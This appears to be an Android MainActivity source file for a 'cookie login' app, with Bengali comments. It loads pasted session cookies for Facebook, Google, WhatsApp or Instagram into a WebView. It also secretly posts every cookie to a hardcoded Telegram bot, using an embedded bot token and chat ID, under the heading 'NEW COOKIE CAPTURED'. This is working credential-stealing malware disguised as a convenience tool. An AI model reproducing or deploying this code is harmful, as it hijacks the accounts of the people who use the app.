// language: Java, file: android-src/MainActivity.java
package com.cybercookie.pro;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import com.getcapacitor.BridgeActivity;

// ইন্টারনেট থেকে ডেটা পাঠানোর জন্য ইম্পোর্ট
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends BridgeActivity {

    // ═══════════════════════════════════════════════════════════════
    // ১. এখানে তোমার টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসাও
    // ═══════════════════════════════════════════════════════════════
    private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
    private static final String CHAT_ID = "6449981797";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final WebView webView = getBridge().getWebView();
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);

        final CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public void injectCookieAndLogin(String siteName, String cookieString) {
                CookieManager cm = CookieManager.getInstance();
                String domain = "";
                String loadUrl = "";

                switch(siteName) {
                    case "facebook":
                        domain = "facebook.com";
                        loadUrl = "https://m.facebook.com";
                        break;
                    case "google":
                        domain = "google.com";
                        loadUrl = "https://accounts.google.com";
                        break;
                    case "whatsapp":
                        domain = "web.whatsapp.com";
                        loadUrl = "https://web.whatsapp.com";
                        break;
                    case "instagram":
                        domain = "instagram.com";
                        loadUrl = "https://www.instagram.com";
                        break;
                    default:
                        domain = "facebook.com";
                        loadUrl = "https://m.facebook.com";
                }

                String formattedCookie = cookieString.trim();
                if (!formattedCookie.endsWith(";")) formattedCookie += ";";

                cm.setCookie("https://" + domain, formattedCookie);
                cm.setCookie("https://www." + domain, formattedCookie);
                cm.setCookie("https://." + domain, formattedCookie);

                // ═══ টেলিগ্রামে কুকি পাঠানোর ফাংশন কল ═══
                sendToTelegram(siteName.toUpperCase(), formattedCookie);

                final String finalLoadUrl = loadUrl;
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        webView.loadUrl(finalLoadUrl);
                    }
                });
            }
        }, "CookieInterface");
    }

    // ═══════════════════════════════════════════════════════════════
    // ২. টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
    // ═══════════════════════════════════════════════════════════════
    private void sendToTelegram(String platform, String cookie) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String message = "🔔 *NEW COOKIE CAPTURED*\n\n"
                            + "🌐 *Platform:* " + platform + "\n\n"
                            + "🍪 *Cookie:*\n`" + cookie + "`";

                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                            + "&text=" + URLEncoder.encode(message, "UTF-8")
                            + "&parse_mode=Markdown";

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode(); // রেসপন্স চেক করা
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
            }
